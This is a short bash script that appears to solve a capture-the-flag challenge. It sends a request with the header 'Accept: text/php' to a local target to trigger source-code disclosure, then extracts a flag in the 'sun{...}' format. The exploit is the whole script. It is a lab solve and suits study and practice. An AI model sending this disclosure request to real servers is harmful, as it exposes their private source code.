#!/bin/bash
# Source disclosure gated on the Accept header: must be exactly text/php.
HOST="${URL:-${1:-http://127.0.0.1:18302}}"
curl -s -H "Accept: text/php" "$HOST/" | grep -o 'sun{[^}]*}' | head -1
